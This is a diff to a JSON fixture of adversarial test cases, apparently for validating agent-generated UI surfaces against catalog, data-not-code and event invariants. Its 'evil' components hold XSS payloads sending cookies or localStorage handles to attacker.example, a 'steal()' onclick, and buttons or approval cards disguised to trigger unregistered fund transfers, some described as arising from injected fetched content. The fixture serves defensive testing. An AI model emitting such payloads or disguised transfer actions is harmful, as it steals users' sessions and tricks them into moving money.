@@ -7,11 +7,31 @@
       "surface": {
         "root": "root",
         "components": [
-          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
-          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
-          {"id": "evil", "type": "RawHtml", "html": "<img src=x onerror=\"fetch('https://attacker.example/e?m='+localStorage.memoryHandle)\">"}
+          {
+            "id": "root",
+            "type": "Column",
+            "children": [
+              "ok",
+              "evil"
+            ]
+          },
+          {
+            "id": "ok",
+            "type": "Text",
+            "variant": "heading",
+            "text": {
+              "$bind": "/title"
+            }
+          },
+          {
+            "id": "evil",
+            "type": "RawHtml",
+            "html": "<img src=x onerror=\"fetch('https://attacker.example/e?m='+localStorage.memoryHandle)\">"
+          }
         ],
-        "dataModel": {"title": "Dashboard"}
+        "dataModel": {
+          "title": "Dashboard"
+        }
       },
       "expect_invariant": "catalog"
     },
@@ -21,11 +41,35 @@
       "surface": {
         "root": "root",
         "components": [
-          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
-          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
-          {"id": "evil", "type": "Button", "label": "Export", "onPress": {"action": "rerun"}, "onclick": "steal()"}
+          {
+            "id": "root",
+            "type": "Column",
+            "children": [
+              "ok",
+              "evil"
+            ]
+          },
+          {
+            "id": "ok",
+            "type": "Text",
+            "variant": "heading",
+            "text": {
+              "$bind": "/title"
+            }
+          },
+          {
+            "id": "evil",
+            "type": "Button",
+            "label": "Export",
+            "onPress": {
+              "action": "rerun"
+            },
+            "onclick": "steal()"
+          }
         ],
-        "dataModel": {"title": "Dashboard"}
+        "dataModel": {
+          "title": "Dashboard"
+        }
       },
       "expect_invariant": "data-not-code"
     },
@@ -35,11 +79,31 @@
       "surface": {
         "root": "root",
         "components": [
-          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
-          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
-          {"id": "evil", "type": "Text", "text": "<script>document.location='https://attacker.example/'+document.cookie</script>"}
+          {
+            "id": "root",
+            "type": "Column",
+            "children": [
+              "ok",
+              "evil"
+            ]
+          },
+          {
+            "id": "ok",
+            "type": "Text",
+            "variant": "heading",
+            "text": {
+              "$bind": "/title"
+            }
+          },
+          {
+            "id": "evil",
+            "type": "Text",
+            "text": "<script>document.location='https://attacker.example/'+document.cookie</script>"
+          }
         ],
-        "dataModel": {"title": "Dashboard"}
+        "dataModel": {
+          "title": "Dashboard"
+        }
       },
       "expect_invariant": "data-not-code"
     },
@@ -49,13 +113,191 @@
       "surface": {
         "root": "root",
         "components": [
-          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
-          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
-          {"id": "evil", "type": "Button", "label": "Wire funds", "onPress": {"action": "transfer_all_funds"}}
+          {
+            "id": "root",
+            "type": "Column",
+            "children": [
+              "ok",
+              "evil"
+            ]
+          },
+          {
+            "id": "ok",
+            "type": "Text",
+            "variant": "heading",
+            "text": {
+              "$bind": "/title"
+            }
+          },
+          {
+            "id": "evil",
+            "type": "Button",
+            "label": "Wire funds",
+            "onPress": {
+              "action": "transfer_all_funds"
+            }
+          }
         ],
-        "dataModel": {"title": "Dashboard"}
+        "dataModel": {
+          "title": "Dashboard"
+        }
       },
       "expect_invariant": "event"
+    },
+    {
+      "name": "deck-as-raw-html",
+      "note": "A competitor's internal deck rendered as raw HTML — the agent tries to emit an executable markup type.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {
+            "id": "root",
+            "type": "Column",
+            "children": [
+              "ok",
+              "evil"
+            ]
+          },
+          {
+            "id": "ok",
+            "type": "Text",
+            "variant": "heading",
+            "text": {
+              "$bind": "/title"
+            }
+          },
+          {
+            "id": "evil",
+            "type": "RawHtml",
+            "html": "<iframe src='https://competitor.example/deck'></iframe>"
+          }
+        ],
+        "dataModel": {
+          "title": "Due Diligence"
+        }
+      },
+      "expect_invariant": "catalog"
+    },
+    {
+      "name": "fetched-description-onerror",
+      "note": "A fetched company description carrying an injected onerror handler on a known component.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {
+            "id": "root",
+            "type": "Column",
+            "children": [
+              "ok",
+              "evil"
+            ]
+          },
+          {
+            "id": "ok",
+            "type": "Text",
+            "variant": "heading",
+            "text": {
+              "$bind": "/title"
+            }
+          },
+          {
+            "id": "evil",
+            "type": "Card",
+            "title": "Acme Corp",
+            "onerror": "document.location='https://attacker.example/?c='+document.cookie"
+          }
+        ],
+        "dataModel": {
+          "title": "Due Diligence"
+        }
+      },
+      "expect_invariant": "data-not-code"
+    },
+    {
+      "name": "approval-disguised-transfer",
+      "note": "A fake approval that is really an unregistered transfer_funds action.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {
+            "id": "root",
+            "type": "Column",
+            "children": [
+              "ok",
+              "evil"
+            ]
+          },
+          {
+            "id": "ok",
+            "type": "Text",
+            "variant": "heading",
+            "text": {
+              "$bind": "/title"
+            }
+          },
+          {
+            "id": "evil",
+            "type": "ApprovalCard",
+            "summary": {
+              "$bind": "/summary"
+            },
+            "params": {
+              "$bind": "/params"
+            },
+            "confirm": {
+              "action": "transfer_funds",
+              "args": {
+                "$bind": "/params"
+              }
+            },
+            "reject": {
+              "action": "reject"
+            }
+          }
+        ],
+        "dataModel": {
+          "title": "Due Diligence",
+          "summary": "Approve investment",
+          "params": {
+            "amount": 1000000
+          }
+        }
+      },
+      "expect_invariant": "event"
+    },
+    {
+      "name": "unregistered-component-type",
+      "note": "A direct reference to a component type that is not in the catalog.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {
+            "id": "root",
+            "type": "Column",
+            "children": [
+              "ok",
+              "evil"
+            ]
+          },
+          {
+            "id": "ok",
+            "type": "Text",
+            "variant": "heading",
+            "text": {
+              "$bind": "/title"
+            }
+          },
+          {
+            "id": "evil",
+            "type": "WebView",
+            "src": "https://competitor.example"
+          }
+        ],
+        "dataModel": {
+          "title": "Due Diligence"
+        }
+      },
+      "expect_invariant": "catalog"
     }
   ]
 }
